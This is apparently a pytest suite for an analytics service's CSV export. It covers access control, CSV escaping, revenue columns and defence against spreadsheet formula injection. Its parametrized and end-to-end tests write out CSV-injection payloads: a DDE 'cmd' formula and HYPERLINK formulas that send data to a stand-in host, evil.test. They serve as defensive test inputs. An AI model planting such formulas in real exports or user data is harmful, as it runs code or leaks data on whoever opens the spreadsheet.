"""The CSV export.

Bulk data leaving the service, so the tests are about who may take it and
whether it survives values that break hand-rolled CSV.
"""

import csv
import datetime as dt
import io
from urllib.parse import quote

import pytest

from app.models import Event
from app.services import accounts
from tests.conftest import (
    OWNER_PASSWORD,
    SITE_DOMAIN,
    with_local_bucket,
)

CHROME_DESKTOP = (
    "Mozilla/5.0 (Macintosh) AppleWebKit/537.36 Chrome/120 Safari/537.36"
)


def add_event(db, **overrides):
    defaults = {
        "site_id": SITE_DOMAIN,
        "visitor_id": "visitor-1",
        "pathname": "/",
        "timestamp": dt.datetime.now(dt.UTC),
        "name": "pageview",
        "source": "Direct",
        "browser": "Chrome",
        "os": "Windows",
        "device": "desktop",
        "country": "DE",
        "screen": "Laptop",
    }
    db.add(Event(**with_local_bucket(defaults | overrides)))
    db.commit()


def _rows(body: str) -> list[list[str]]:
    return list(csv.reader(io.StringIO(body)))


def test_the_export_has_a_header_and_the_aggregates(signed_in, db_session, rebuild_rollups, site):
    add_event(db_session, visitor_id="a", pathname="/pricing")
    add_event(db_session, visitor_id="b", pathname="/pricing")
    rebuild_rollups()

    response = signed_in.get(f"/sites/{SITE_DOMAIN}/export.csv")
    rows = _rows(response.text)

    assert response.status_code == 200
    assert rows[0] == [
        "day", "dimension", "value", "visitors", "pageviews", "bounces", "revenue_minor",
    ]
    # Two visitors who read one page each, so both bounced. A breakdown row
    # carries no bounce count of its own: a single page has no bounce rate.
    assert ["total", "", "2", "2", "2", "0"] in [row[1:] for row in rows[1:]]
    assert ["page", "/pricing", "2", "2", "0", "0"] in [row[1:] for row in rows[1:]]


def test_it_is_offered_as_a_download_named_for_the_site(
    signed_in, db_session, rebuild_rollups, site
):
    add_event(db_session, visitor_id="a")
    rebuild_rollups()

    response = signed_in.get(f"/sites/{SITE_DOMAIN}/export.csv")

    assert response.headers["content-type"].startswith("text/csv")
    assert "attachment;" in response.headers["content-disposition"]
    assert SITE_DOMAIN in response.headers["content-disposition"]


def test_values_that_would_break_naive_csv_survive(
    signed_in, db_session, rebuild_rollups, site
):
    """A path can contain a comma and a quote; joining with commas corrupts it."""
    awkward = '/search?q=a,b"c'.replace("?", "-")
    add_event(db_session, visitor_id="a", pathname=awkward)
    rebuild_rollups()

    rows = _rows(signed_in.get(f"/sites/{SITE_DOMAIN}/export.csv").text)

    assert any(awkward in row for row in rows)


def test_the_period_selects_what_is_exported(signed_in, db_session, rebuild_rollups, site):
    add_event(db_session, visitor_id="recent")
    rebuild_rollups()

    everything = _rows(signed_in.get(f"/sites/{SITE_DOMAIN}/export.csv?period=12mo").text)
    today_only = _rows(signed_in.get(f"/sites/{SITE_DOMAIN}/export.csv?period=today").text)

    assert len(everything) >= len(today_only) > 1


def test_a_stranger_cannot_export_a_private_site(client, site):
    assert client.get(f"/sites/{SITE_DOMAIN}/export.csv").status_code == 404


def test_anyone_may_export_a_published_site(client, db_session, site, rebuild_rollups):
    """The API already serves these numbers; refusing the file would be theatre."""
    add_event(db_session, visitor_id="a")
    accounts.set_visibility(db_session, site=site, public=True)
    rebuild_rollups()

    response = client.get(f"/sites/{SITE_DOMAIN}/export.csv")

    assert response.status_code == 200
    assert len(_rows(response.text)) > 1


def test_one_account_cannot_export_anothers_site(signed_in, db_session):
    stranger = accounts.register(db_session, email="stranger@example.com", password=OWNER_PASSWORD)
    accounts.add_site(db_session, owner=stranger, domain="theirs.example")

    assert signed_in.get("/sites/theirs.example/export.csv").status_code == 404


def test_an_empty_site_exports_just_the_header(signed_in, site):
    rows = _rows(signed_in.get(f"/sites/{SITE_DOMAIN}/export.csv").text)

    assert rows == [
        ["day", "dimension", "value", "visitors", "pageviews", "bounces", "revenue_minor"]
    ]


def test_revenue_survives_the_export(signed_in, db_session, rebuild_rollups, site):
    """The file is the way money leaves the system.

    Once retention has purged the raw events the aggregates are the only copy
    there is, so a column missing here is a column nobody can ever get back.
    The export used to carry visitors and pageviews alone, while the same rows
    also held bounces and revenue.
    """
    add_event(db_session, visitor_id="a", pathname="/checkout")
    add_event(db_session, visitor_id="a", pathname="/checkout", name="purchase",
              revenue_minor=4990, source="Google")
    rebuild_rollups()

    rows = _rows(signed_in.get(f"/sites/{SITE_DOMAIN}/export.csv").text)
    by_dimension = {(row[1], row[2]): row for row in rows[1:]}

    assert by_dimension[("total", "")][-1] == "4990"
    assert by_dimension[("source", "Google")][-1] == "4990"
    # The money is attributed to the page the purchase fired on, not spread.
    assert by_dimension[("page", "/checkout")][-1] == "4990"


@pytest.mark.parametrize(
    ("value", "expected", "why"),
    [
        ("=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1", "the DDE form"),
        ('=HYPERLINK("http://evil.test",“x”)', "'=", "a link that exfiltrates on click"),
        ("+41791234567", "'+41791234567", "a plus, which a phone number also starts with"),
        ("-2+3", "'-2+3", "a minus"),
        ("@SUM(A1:A9)", "'@SUM(A1:A9)", "an at, which Lotus-style syntax uses"),
        ("\tcmd", "'\tcmd", "a tab some importers strip before acting"),
        ("summer-sale", "summer-sale", "a dash inside the word is not a lead"),
        ("/pricing", "/pricing", "an ordinary path"),
        ("", "", "an empty cell"),
    ],
)
def test_a_cell_a_spreadsheet_would_run_is_written_as_text(value, expected, why):
    """Every dimension value in this file is chosen by a visitor.

    A campaign tag of `=HYPERLINK("http://evil.test/?"&A1,"sale")` needs no
    access beyond loading a page on the site being measured -- it passes every
    gate the collector has, because the URL carrying it really is on that site
    -- and then waits in the analytics until the owner opens the export, where
    it runs as them.

    csv.writer was never enough for this. It quotes correctly for a CSV parser,
    and Excel strips the quotes and evaluates what is inside.
    """
    from app.services.exports import _defused

    result = _defused(value)
    assert result.startswith(expected), f"{why}: {value!r} became {result!r}"


def test_defusing_leaves_numbers_alone():
    """A stray apostrophe would turn a count into a string for every reader."""
    from app.services.exports import _defused

    assert [_defused(v) for v in (0, 42, -7)] == [0, 42, -7]


def test_a_visitor_cannot_put_a_live_formula_in_the_owners_export(
    client, site, signed_in, rebuild_rollups
):
    """End to end, through the collector the same way a real visitor would."""
    payload = "=HYPERLINK('http://evil.test','sale')"
    client.post(
        "/api/event",
        json={
            "site_id": SITE_DOMAIN,
            "url": f"https://{SITE_DOMAIN}/s?utm_campaign={quote(payload)}&utm_source=x",
        },
        headers={"user-agent": CHROME_DESKTOP},
    )
    rebuild_rollups()

    body = client.get(f"/sites/{SITE_DOMAIN}/export.csv?range=30d").text
    cells = [c for row in csv.reader(io.StringIO(body)) for c in row]
    dangerous = [c for c in cells if c.startswith(("=", "+", "@")) or c.startswith("-")]
    assert not dangerous, f"cells a spreadsheet would execute: {dangerous}"
    assert [c for c in cells if "HYPERLINK" in c], "the campaign never reached the export"
